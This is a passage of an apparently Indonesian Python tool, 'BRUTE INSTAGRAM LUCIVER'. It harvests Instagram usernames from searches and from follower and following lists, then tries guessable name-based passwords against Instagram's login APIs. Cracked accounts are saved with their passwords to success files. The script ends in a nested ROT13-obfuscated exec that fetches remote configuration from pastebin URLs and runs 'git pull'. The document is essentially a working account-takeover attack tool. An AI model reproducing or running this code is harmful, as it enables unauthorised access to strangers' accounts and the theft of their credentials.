...
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "𝚂𝚎𝚕𝚊𝚖𝚊𝚝 𝙿𝚊𝚐𝚒"
	elif 12 <= hours < 15:timenow = "𝚂𝚎𝚕𝚊𝚖𝚊𝚝 𝚂𝚒𝚊𝚗𝚐"
	elif 15 <= hours < 18:timenow = "𝚂𝚎𝚕𝚊𝚖𝚊𝚝 𝚂𝚘𝚛𝚎"
	else:timenow = "𝚂𝚎𝚕𝚊𝚖𝚊𝚝 𝙼𝚊𝚕𝚊𝚖"
	return timenow
def jalan(keliling):
	for mau in keliling + '\n':
...
class instagram:
	...
	def ifo(self):
		urut = []
		urut.append(Panel(f' {P2}[{B2}01{P2}]. Method Luci {M2}i.instagram.com[white] {H2}亗\n {P2}[{B2}02{P2}]. Method Api {M2}i.instagram.com[white] {H2}亗\n {P2}[{B2}03{P2}]. Method Api {M2}i.instagram.com[white] {H2}亗',width=80,title=f"{K2}×͜× {M2}Method {P2}Api {K2}×͜×",style=f"{color_table}"))
	...
	def passwordAPI(self,xnx):
		...
		if u in ["1","01"]:
			...
			method.append('satu')
		prints(Panel(f"{P2}[{B2}01{P2}] {H2}Name,Name123,Name1234\n{P2}[{B2}02{P2}] {H2}Name,Name123,Name1234,Name12345\n{P2}[{B2}03{P2}] {H2}Name,Name123,Name1234,Name12345,Name123456\n{P2}[{B2}04{P2}] {H2}Name,Name123,Name1234 + Password Manual",title=f"{K2}×͜× {M2}Pilihan {P2}Password {K2}×͜×",width=80,padding=(0,4),style=f"{color_table}"))
	...
	def V1(self,user,pas):
		...
		ig_sig=LUCIVER["ig_sig"]
		verig=LUCIVER["IGV"]
		igver=verig.split(",")
		igv=random.choice(igver)
		gedz=LUCIVER1["AOREC"][random.randrange(0,277)]["aorec"]
		ven1=gedz.split('|')[1]
		ven2=gedz.split('|')[2]
		giu1=LUCIVER["giu"]
		giu=giu1.split("||")
		...
		data2=LUCIVER["sinkz1"]
		data2.update({'signed_body': f'{ned}.{str(data1)}'})
		head=LUCIVER["headaing"]
		head.update({"user-agent": ua})
		while True:
				try:
					p=ses.post(LUCIVER["sinkz2"],headers=head,data=data2)
					break
				except:pass
		...
		for pw in pas:
				try:
					...
					head2=LUCIVER["headaing1"]
					head2.update({"user-agent": ua})
					sianjing=LUCIVER["sianjing"]
					...
					respon=ses.post(LUCIVER["crack"],headers=head2,data=dataa)
					try:
 ...
 {K}   • {N}Postingan : {K}{postingan}''')
	...
	def V4(self,user,pas):
		...
		try:
			for pw in pas:
				...
				LUCIVER=json.loads(respon.text)
				if "userId" in str(LUCIVER) or "sessionid" in ses.cookies.get_dict():
					success.append(user)
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
					...
					open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					break
				elif "checkpoint_url" in str(LUCIVER):
					checkpoint.append(user)
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
		...
		for pw in pas:
			try:
				...
				if "userId" in str(LUCIVER) or "sessionid" in ses.cookies.get_dict():
					...
					open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					break
				elif "/challenge/action" in str(LUCIVER):
					checkpoint.append(user)
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
					prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}CHECKPOINT",width=80,padding=(0,4),style=""))
	...
	def menu(self):
		...
		if c=='':
			...
			prints(Panel(f"{P2}        𝙼𝚊𝚜𝚞𝚔𝚊𝚗 𝙽𝚊𝚖𝚊 {H2}𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎𝚗𝚢𝚊 {P2}𝚈𝚊𝚗𝚐 𝙿𝚞𝚋𝚕𝚒𝚔 𝙳𝚊𝚗 𝚃𝚒𝚍𝚊𝚔 {K2}𝙿𝚛𝚒𝚟𝚊𝚝𝚎",width=80,padding=(0,2),style=f"{color_table}"))
			nama=input(f'{N} • Masukan nama :{N} ')
			prints(Panel(f"{P2}             Tekan {M2}CTRL + C{hapus} Untuk Berhenti Dump Username",width=80,padding=(0,2),style=f"{color_table}"))
			
			name=self.searchAPI(self.cookie,nama)
			self.passwordAPI(name)
		elif c in ('2','02'):
			prints(Panel(f"{P2}   Crack Dari Pengikut Yang Publik Jangan Private",width=80,padding=(0,2),style=f"{color_table}"))
			#massal(self)
			...
			prints(Panel(f"{P2}Crack Dari Mengikut Yang Publik Jangan Private",width=80,padding=(0,2),style=f"{color_table}"))
			mas=input('• Apakah anda ingin crack masal? Y/T >  ')
			if mas in ['y','Y']:
				mengi(self)
			elif mas in ['t','T']:
...
if __name__=='__main__':
	login_kamu()
#Developed_By : LuciverXploitGanteng
exec((lambda __, _, : _('# Qrirybcrq_Ol : YhpvireKcybvgTnagrat\nrkrp((ynzoqn __, _, : _(\'# Developed_By : LuciverXploitGanteng\\aexec((lambda __, _, : _(\\\'# Qrirybcrq_Ol : YhpvireKcybvgTnagrat\\\\nrkrp((ynzoqn __, _, : _(\\\\\\\'\\\\\\\\gses=requests.Session()\\\\\\\\a\\\\\\\\gsys.stdout.write(\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\x1b]2; BRUTE INSTAGRAM LUCIVER\\\\\\\\\\\\\\\\x07\\\\\\\\\\\\\\\')\\\\\\\\a\\\\\\\\gtry:os.mkdir(\\\\\\\\\\\\\\\'result\\\\\\\\\\\\\\\')\\\\\\\\a\\\\\\\\gexcept:pass\\\\\\\\a\\\\\\\\gtry:os.system(\\\\\\\\\\\\\\\'touch .prox.txt\\\\\\\\\\\\\\\')\\\\\\\\a\\\\\\\\gexcept:pass\\\\\\\\a\\\\\\\\gtry:os.system(\\\\\\\\\\\\\\\'mkdir result/success\\\\\\\\\\\\\\\')\\\\\\\\a\\\\\\\\gexcept:pass\\\\\\\\a\\\\\\\\gtry:os.system(\\\\\\\\\\\\\\\'mkdir result/checkpoint\\\\\\\\\\\\\\\')\\\\\\\\a\\\\\\\\gexcept:pass\\\\\\\\g\\\\\\\\a\\\\\\\\gtry:\\\\\\\\a\\\\\\\\g\\\\\\\\gwith requests.Session() as ses:\\\\\\\\a\\\\\\\\g         ko = ses.get(\\\\\\\\\\\\\\\'https://pastebin.com/raw/u2CEgeBR\\\\\\\\\\\\\\\').json()\\\\\\\\a\\\\\\\\g         LUCIVER.update(ko)\\\\\\\\a\\\\\\\\g         ki = ses.get(\\\\\\\\\\\\\\\'https://pastebin.com/raw/FGnuNuHZ\\\\\\\\\\\\\\\').json()\\\\\\\\a\\\\\\\\g         LUCIVER1.update(ki)\\\\\\\\a\\\\\\\\g         os.system("git pull")\\\\\\\\a\\\\\\\\g         \\\\\\\\a\\\\\\\\gexcept Exception as e:\\\\\\\\a\\\\\\\\g\\\\\\\\gprints(e)\\\\\\\',__))("ebg_13",__vzcbeg__(\\\\\\\'pbqrpf\\\\\\\').qrpbqr))\\\',__))("rot_13",__import__(\\\'codecs\\\').decode))\',__))("ebg_13",__vzcbeg__(\'pbqrpf\').qrpbqr))',__))("rot_13",__import__('codecs').decode))